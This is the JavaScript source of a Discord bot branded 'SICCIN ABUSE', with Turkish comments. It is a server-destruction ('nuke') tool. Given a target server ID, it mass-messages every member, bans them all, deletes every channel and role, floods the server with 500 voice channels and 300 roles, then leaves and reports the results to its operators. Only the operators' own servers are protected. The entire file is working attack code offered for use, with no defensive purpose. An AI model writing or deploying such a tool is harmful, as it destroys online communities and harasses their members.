require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActivityType,
  ChannelType
} = require("discord.js");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const BOT_TOKEN = process.env.BOT_TOKEN;

// ================== KORUNAN SUNUCULAR ==================
const PROTECTED_SERVERS = [
  "1457028521707962370",
  "1457597987294285979"
];

// ================== KANAL İSİMLERİ (SIRALI) ==================
const CHANNEL_NAMES = [
  "BİZDEN",
  "KAÇAMAZSINIZ",
  ".gg/siccin👺",
  "EDEBİ🔱",
  "SİZLERİ",
  "BİZLER",
  "VAR",
  "ETTİK"
];

// ================== ROL İSİMLERİ ==================
const ROLE_NAME = "S I C C İ N🔱";

// ================== DURUM KONTROL ==================
function hasSiccinStatus(member) {
  if (!member?.presence?.activities) return false;
  return member.presence.activities.some(
    (a) =>
      a.type === ActivityType.Custom &&
      a.state &&
      (a.state.includes("/siccin") || a.state.includes(".gg/siccin"))
  );
}

// ================== KORUNAN SUNUCU KONTROLÜ ==================
function isProtectedServer(guildId) {
  return PROTECTED_SERVERS.includes(guildId.toString());
}

// ================== EMBEDLER ==================
function mainSiccinEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#3a0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ ABUSE",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setThumbnail(guild.iconURL({ dynamic: true }))
    .setDescription(
      `**Özellikler**
• Herkese DM Çeker ve Banlar
• Tüm Kanal ve Rolleri Siler
• 500 Ses Kanalı Oluşturur
• 300 Rol Oluşturur
• İşlem Bitince Sunucudan Çıkar

**Kanal İsimleri (Sıralı):**
${CHANNEL_NAMES.map(name => `• ${name}`).join('\n')}

**Rol İsimleri:** ${ROLE_NAME}

**Nasıl Kullanılır?**
[Butona tıklayarak botu sunucuya ekle](https://discord.com/oauth2/authorize?client_id=1459824610211008592)

    )
    .setFooter({ text: "ＳＩＣＣＩＮ | Glory to Siccin" })
    .setTimestamp();
}

function dmEmbed(guild) {
  return new EmbedBuilder()
    .setColor("#2b0000")
    .setAuthor({
      name: "ＳＩＣＣＩＮ EJECTED",
      iconURL: guild.iconURL({ dynamic: true }),
    })
    .setDescription(
      `ＳＩＣＣＩＮ Tarafından
${guild.name} sunucusuna el konulmuştur.

#GLORY TO ＳＩＣＣＩＮ
https://discord.gg/siccin`
    );
}

function protectedServerErrorEmbed(targetGuildId) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚫 ERİŞİM ENGELLENDİ")
    .setDescription(
      `**${targetGuildId}** ID'li sunucu koruma altındadır!\n\nBu sunucuya herhangi bir işlem yapılamaz.`
    )
    .setTimestamp();
}

function logEmbed(data) {
  return new EmbedBuilder()
    .setColor("#1a0000")
    .setAuthor({
      name: `${data.usedGuild} | S I C C İ N EJECTED`,
      iconURL: "https://cdn.discordapp.com/emojis/1234567890123456789.png"
    })
    .setThumbnail(data.targetIcon)
    .addFields(
      {
        name: "🔱 Kullanıcı",
        value: `**ID:** ${data.userId}\n**Tag:** ${data.userTag}`,
        inline: true
      },
      {
        name: "🎯 Hedef Sunucu",
        value: `**ID:** ${data.guildId}\n**İsim:** ${data.guildName}`,
        inline: true
      },
      {
        name: "📊 İstatistikler",
        value: `📨 DM: **${data.dmSent}**\n🔨 Ban: **${data.banned}**\n🗑️ Silinen Kanal: **${data.channelsDeleted}**\n🗑️ Silinen Rol: **${data.rolesDeleted}**\n➕ Ses Kanalı: **${data.channelsCreated}**\n➕ Rol: **${data.rolesCreated}**`
      },
      {
        name: "🕒 Zaman",
        value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
        inline: true
      }
    )
    .setFooter({ text: "S I C C İ N 🔱 | .gg/siccin" })
    .setTimestamp();
}

function protectionAlertEmbed(data) {
  return new EmbedBuilder()
    .setColor("#ff0000")
    .setTitle("🚨 KORUNAN SUNUCUYA ERİŞİM DENEMESİ")
    .addFields(
      {
        name: "👤 Kullanıcı",
        value: `${data.userTag} (${data.userId})`,
        inline: true,
      },
      {
        name: "🏠 Bulunduğu Sunucu",
        value: `${data.usedGuild}`,
        inline: true,
      },
      {
        name: "🎯 Hedef Sunucu ID",
        value: `\`${data.targetGuildId}\``,
        inline: false,
      },
      {
        name: "🔒 Durum",
        value: "**ENGELLENDİ**",
        inline: true,
      }
    )
    .setFooter({ text: "S I C C İ N Koruma Sistemi" })
    .setTimestamp();
}

// ================== SICCiN İŞLEM ==================
async function startSiccin(interaction, targetGuildId) {
  const executor = interaction.user;
  const usedGuild = interaction.guild.name;

  // KORUNAN SUNUCU KONTROLÜ
  if (isProtectedServer(targetGuildId)) {
    const alertData = {
      userTag: executor.tag,
      userId: executor.id,
      usedGuild: usedGuild,
      targetGuildId: targetGuildId
    };
    
    const alertEmbed = protectionAlertEmbed(alertData);
    
    try {
      const ownerUser = await client.users.fetch(OWNER_ID);
      await ownerUser.send({ embeds: [alertEmbed] });
      console.log(`[KORUMA] Owner'a bildirim gönderildi: ${OWNER_ID}`);
    } catch (err) {
      console.error("[KORUMA] Owner'a bildirim gönderilemedi:", err);
    }
    
    try {
      const seriUser = await client.users.fetch(SERI_ID);
      await seriUser.send({ embeds: [alertEmbed] });
      console.log(`[KORUMA] Seri'ye bildirim gönderildi: ${SERI_ID}`);
    } catch (err) {
      console.error("[KORUMA] Seri'ye bildirim gönderilemedi:", err);
    }
    
    return interaction.followUp({
      embeds: [protectedServerErrorEmbed(targetGuildId)],
      ephemeral: true,
    });
  }

  const guild = client.guilds.cache.get(targetGuildId);
  if (!guild)
    return interaction.followUp({
      content: "❌ Bot hedef sunucuda değil",
      ephemeral: true,
    });

  await interaction.followUp({
    content: "⚡ SICCiN BAŞLATILDI - SÜPER HIZLI MOD\n⏱️ İşlemler anında yapılıyor...",
    ephemeral: true,
  });

  let dmSent = 0;
  let banned = 0;
  let channelsDeleted = 0;
  let rolesDeleted = 0;
  let channelsCreated = 0;
  let rolesCreated = 0;

  // ================== 1. HERKESE DM ÇEK (HIZLI) ==================
  try {
    console.log(`[${guild.name}] DM gönderiliyor...`);
    const members = await guild.members.fetch();
    
    const dmPromises = [];
    for (const member of members.values()) {
      if (member.user.bot) continue;
      
      dmPromises.push(
        member.send({ embeds: [dmEmbed(guild)] })
          .then(() => {
            dmSent++;
            if (dmSent % 10 === 0) {
              console.log(`[${guild.name}] ${dmSent}. DM gönderildi`);
            }
          })
          .catch(() => {})
      );
    }
    
    // Hepsini aynı anda gönder, rate limit için batch yap
    const batchSize = 5;
    for (let i = 0; i < dmPromises.length; i += batchSize) {
      const batch = dmPromises.slice(i, i + batchSize);
      await Promise.allSettled(batch);
      await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    console.log(`[${guild.name}] ${dmSent} kişiye DM gönderildi`);
  } catch (err) {
    console.error(`[${guild.name}] DM hatası:`, err.message);
  }

  // ================== 2. HERKESİ BANLA (HIZLI) ==================
  try {
    console.log(`[${guild.name}] Banlama başlıyor...`);
    const members = await guild.members.fetch();
    
    const banPromises = [];
    for (const member of members.values()) {
      if (member.user.bot) continue;
      
      banPromises.push(
        member.ban({ reason: "ＳＩＣＣＩＮ 🔱 | .gg/siccin" })
          .then(() => {
            banned++;
            if (banned % 10 === 0) {
              console.log(`[${guild.name}] ${banned}. kişi banlandı`);
            }
          })
          .catch(() => {})
      );
    }
    
    // Batch banlama
    const batchSize = 3;
    for (let i = 0; i < banPromises.length; i += batchSize) {
      const batch = banPromises.slice(i, i + batchSize);
      await Promise.allSettled(batch);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log(`[${guild.name}] ${banned} kişi banlandı`);
  } catch (err) {
    console.error(`[${guild.name}] Ban hatası:`, err.message);
  }

  // ================== 3. TÜM KANALLARI SİL (ÇOK HIZLI) ==================
  try {
    console.log(`[${guild.name}] Kanallar siliniyor...`);
    const channels = Array.from(guild.channels.cache.values());
    
    const deletePromises = [];
    for (const channel of channels) {
      deletePromises.push(
        channel.delete()
          .then(() => {
            channelsDeleted++;
          })
          .catch(() => {})
      );
    }
    
    // Tüm kanalları aynı anda silmeye çalış
    await Promise.allSettled(deletePromises);
    console.log(`[${guild.name}] ${channelsDeleted} kanal silindi`);
  } catch (err) {
    console.error(`[${guild.name}] Kanal silme hatası:`, err.message);
  }

  // ================== 4. TÜM ROLLERİ SİL (ÇOK HIZLI) ==================
  try {
    console.log(`[${guild.name}] Roller siliniyor...`);
    const roles = Array.from(guild.roles.cache.values());
    
    const roleDeletePromises = [];
    for (const role of roles) {
      if (role.id === guild.id || role.managed) continue;
      
      roleDeletePromises.push(
        role.delete()
          .then(() => {
            rolesDeleted++;
          })
          .catch(() => {})
      );
    }
    
    // Tüm rolleri aynı anda sil
    await Promise.allSettled(roleDeletePromises);
    console.log(`[${guild.name}] ${rolesDeleted} rol silindi`);
  } catch (err) {
    console.error(`[${guild.name}] Rol silme hatası:`, err.message);
  }

  // ================== 5. 500 SES KANALI OLUŞTUR (SÜPER HIZLI) ==================
  try {
    console.log(`[${guild.name}] 500 ses kanalı oluşturuluyor...`);
    
    const channelPromises = [];
    for (let i = 0; i < 500; i++) {
      const channelName = CHANNEL_NAMES[i % CHANNEL_NAMES.length];
      
      channelPromises.push(
        guild.channels.create({
          name: channelName,
          type: ChannelType.GuildVoice,
          bitrate: 96000,
          userLimit: 0,
          rtcRegion: null
        })
          .then(() => {
            channelsCreated++;
            if (channelsCreated % 50 === 0) {
              console.log(`[${guild.name}] ${channelsCreated}. kanal oluşturuldu: ${channelName}`);
            }
          })
          .catch(err => {
            console.log(`[${guild.name}] Kanal oluşturulamadı:`, err.message);
          })
      );
    }
    
    // Batch oluşturma - ÇOK HIZLI
    const batchSize = 25;
    for (let i = 0; i < channelPromises.length; i += batchSize) {
      const batch = channelPromises.slice(i, i + batchSize);
      await Promise.allSettled(batch);
      await new Promise(resolve => setTimeout(resolve, 10)); // ÇOK KISA BEKLEME
    }
    
    console.log(`[${guild.name}] ${channelsCreated} ses kanalı oluşturuldu`);
  } catch (err) {
    console.error(`[${guild.name}] Kanal oluşturma hatası:`, err.message);
  }

  // ================== 6. 300 ROL OLUŞTUR (HIZLI) ==================
  try {
    console.log(`[${guild.name}] 300 rol oluşturuluyor...`);
    
    const rolePromises = [];
    for (let i = 0; i < 300; i++) {
      rolePromises.push(
        guild.roles.create({
          name: ROLE_NAME,
          color: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
          permissions: [],
          mentionable: true,
          hoist: true
        })
          .then(() => {
            rolesCreated++;
            if (rolesCreated % 30 === 0) {
              console.log(`[${guild.name}] ${rolesCreated}. rol oluşturuldu`);
            }
          })
          .catch(err => {
            console.log(`[${guild.name}] Rol oluşturulamadı:`, err.message);
          })
      );
    }
    
    // Batch rol oluşturma
    const batchSize = 20;
    for (let i = 0; i < rolePromises.length; i += batchSize) {
      const batch = rolePromises.slice(i, i + batchSize);
      await Promise.allSettled(batch);
      await new Promise(resolve => setTimeout(resolve, 20));
    }
    
    console.log(`[${guild.name}] ${rolesCreated} rol oluşturuldu`);
  } catch (err) {
    console.error(`[${guild.name}] Rol oluşturma hatası:`, err.message);
  }

  // ================== 7. SUNUCUDAN ÇIK ==================
  try {
    console.log(`[${guild.name}] Sunucudan çıkılıyor...`);
    await guild.leave();
    console.log(`[${guild.name}] Sunucudan çıkıldı`);
  } catch (leaveErr) {
    console.error(`[${guild.name}] Çıkma hatası:`, leaveErr.message);
  }

  // ================== LOG GÖNDER (OWNER VE SERİ) ==================
  const log = logEmbed({
    usedGuild,
    userId: executor.id,
    userTag: executor.tag,
    guildId: guild.id,
    guildName: guild.name,
    targetIcon: guild.iconURL({ dynamic: true }),
    dmSent,
    banned,
    channelsDeleted,
    rolesDeleted,
    channelsCreated,
    rolesCreated,
  });

  // OWNER'A LOG GÖNDER
  try {
    const ownerUser = await client.users.fetch(OWNER_ID);
    await ownerUser.send({ embeds: [log] });
    console.log(`[LOG] Owner'a log gönderildi: ${OWNER_ID}`);
  } catch (logErr) {
    console.error("[LOG] Owner'a log gönderilemedi:", logErr.message);
  }

  // SERİ'YE LOG GÖNDER
  try {
    const seriUser = await client.users.fetch(SERI_ID);
    await seriUser.send({ embeds: [log] });
    console.log(`[LOG] Seri'ye log gönderildi: ${SERI_ID}`);
  } catch (logErr) {
    console.error("[LOG] Seri'ye log gönderilemedi:", logErr.message);
  }

  // ================== İŞLEM TAMAMLANDI BİLDİRİMİ ==================
  try {
    await interaction.followUp({
      content: `✅ **S I C C İ N İŞLEMİ TAMAMLANDI!**\n\n` +
               `📨 **DM Gönderilen:** ${dmSent} kişi\n` +
               `🔨 **Banlanan:** ${banned} kişi\n` +
               `🗑️ **Silinen:** ${channelsDeleted} kanal, ${rolesDeleted} rol\n` +
               `➕ **Oluşturulan:** ${channelsCreated} ses kanalı\n` +
               `➕ **Oluşturulan:** ${rolesCreated} rol (${ROLE_NAME})\n` +
               `📝 **Kanal İsimleri:** ${CHANNEL_NAMES.join(' → ')}\n` +
               `🚪 **Bot sunucudan ayrıldı.**\n\n` +
               `#GLORY TO ＳＩＣＣＩＮ 🔱\n` +
               `**Loglar Owner ve Seri'ye gönderildi!**`,
      ephemeral: true,
    });
  } catch (finalErr) {
    console.error("Final bildirimi gönderilemedi:", finalErr.message);
  }
}

// ================== MESSAGE İŞLEME ==================
client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.guild) return;

  // .siccin komutu kontrolü
  if (message.content.toLowerCase() === ".siccin") {
    try {
      const embed = mainSiccinEmbed(message.guild);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId("siccinStart")
          .setLabel("ＳＩＣＣＩＮ BAŞLAT")
          .setStyle(ButtonStyle.Danger)
          .setEmoji("🔥")
      );
      
      await message.channel.send({ 
        embeds: [embed], 
        components: [row] 
      });
      
    } catch (error) {
      console.error("Embed gönderilemedi:", error);
      message.reply("❌ Embed gönderilirken hata oluştu!").catch(() => {});
    }
    return;
  }

  // ID ekleme komutu (Owner için)
  if (message.content.startsWith("!ekle") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !ekle <sunucu-id>");
    }

    const newId = args[1];
    if (PROTECTED_SERVERS.includes(newId)) {
      return message.reply("Bu ID zaten koruma listesinde!");
    }

    PROTECTED_SERVERS.push(newId);
    message.reply(`✅ ${newId} ID'li sunucu koruma listesine eklendi!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // ID silme komutu (Owner için)
  if (message.content.startsWith("!sil") && message.author.id === OWNER_ID) {
    const args = message.content.split(" ");
    if (args.length < 2) {
      return message.reply("Kullanım: !sil <sunucu-id>");
    }

    const removeId = args[1];
    const index = PROTECTED_SERVERS.indexOf(removeId);
    if (index === -1) {
      return message.reply("Bu ID koruma listesinde bulunamadı!");
    }

    PROTECTED_SERVERS.splice(index, 1);
    message.reply(`✅ ${removeId} ID'li sunucu koruma listesinden kaldırıldı!\n\nGüncel liste:\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }

  // Liste görüntüleme komutu
  if (message.content === "!korunanlar") {
    message.reply(`**Korunan Sunucular:**\n${PROTECTED_SERVERS.map(id => `• ${id}`).join('\n')}`);
  }
});

// ================== INTERACTION İŞLEME ==================
client.on("interactionCreate", async (interaction) => {
  // ================== BUTTON ==================
  if (interaction.isButton() && interaction.customId === "siccinStart") {
    const modal = new ModalBuilder()
      .setCustomId("siccinModal")
      .setTitle("Hedef Sunucu ID")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("guildID")
            .setLabel("Hedef Sunucu ID")
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setPlaceholder("Sunucu ID'sini girin...")
        )
      );

    return interaction.showModal(modal);
  }

  // ================== MODAL ==================
  if (interaction.isModalSubmit() && interaction.customId === "siccinModal") {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    
    if (!hasSiccinStatus(member)) {
      return interaction.reply({
        content: "❌ Durumunda /siccin veya .gg/siccin yok",
        ephemeral: true,
      });
    }

    const gid = interaction.fields.getTextInputValue("guildID").trim();

    // KORUNAN SUNUCU KONTROLÜ
    if (isProtectedServer(gid)) {
      const alertData = {
        userTag: interaction.user.tag,
        userId: interaction.user.id,
        usedGuild: interaction.guild.name,
        targetGuildId: gid
      };
      
      const alertEmbed = protectionAlertEmbed(alertData);
      
      try {
        const ownerUser = await client.users.fetch(OWNER_ID);
        await ownerUser.send({ embeds: [alertEmbed] });
      } catch (err) {
        console.error("Owner'a bildirim gönderilemedi:", err);
      }
      
      try {
        const seriUser = await client.users.fetch(SERI_ID);
        await seriUser.send({ embeds: [alertEmbed] });
      } catch (err) {
        console.error("Seri'ye bildirim gönderilemedi:", err);
      }
      
      return interaction.reply({
        embeds: [protectedServerErrorEmbed(gid)],
        ephemeral: true,
      });
    }

    await interaction.deferReply({ ephemeral: true });
    return startSiccin(interaction, gid);
  }
});

// ================== BOT HAZIR ==================
client.on("ready", () => {
  console.log(`🔥 ${client.user.tag} olarak giriş yapıldı!`);
  console.log(`🔒 Korunan sunucular: ${PROTECTED_SERVERS.join(", ")}`);
  
  // Bot durumu
  client.user.setActivity({
    name: ".gg/siccin | EDEBİ🔱",
    type: ActivityType.Watching,
  });
  
  client.user.setStatus('dnd');
  
  console.log("═══════════════════════════════════════");
  console.log("⚡ S I C C İ N 🔱 BOT AKTİF");
  console.log(`📊 Bot Durumu: .gg/siccin | EDEBİ🔱`);
  console.log(`👑 Owner ID: ${OWNER_ID}`);
  console.log(`👥 Seri ID: ${SERI_ID}`);
  console.log("═══════════════════════════════════════");
  console.log("🎯 Kanal İsimleri (Sıralı):");
  CHANNEL_NAMES.forEach((name, index) => {
    console.log(`  ${index + 1}. ${name}`);
  });
  console.log("═══════════════════════════════════════");
  console.log(`👥 Rol İsmi: ${ROLE_NAME}`);
  console.log("═══════════════════════════════════════");
  console.log("⚡ İşlem Sırası (SÜPER HIZLI MOD):");
  console.log("  1. DM gönder (Batch: 5, Delay: 50ms)");
  console.log("  2. Banla (Batch: 3, Delay: 100ms)");
  console.log("  3. Kanalları sil (No delay)");
  console.log("  4. Rolleri sil (No delay)");
  console.log("  5. 500 ses kanalı (Batch: 25, Delay: 10ms)");
  console.log("  6. 300 rol (Batch: 20, Delay: 20ms)");
  console.log("  7. Sunucudan çık");
  console.log("  8. Log gönder (Owner & Seri)");
  console.log("═══════════════════════════════════════");
});

// ================== CRASH KALKAN ==================
process.on("unhandledRejection", (err) => {
  console.log("❌ UNHANDLED REJECTION:", err.message || err);
});
process.on("uncaughtException", (err) => {
  console.log("💥 UNCAUGHT EXCEPTION:", err.message || err);
});

client.login(BOT_TOKEN).then(() => {
  console.log("✅ Bot token ile giriş yapıldı!");
}).catch(err => {
  console.error("❌ Bot giriş hatası:", err.message);
});
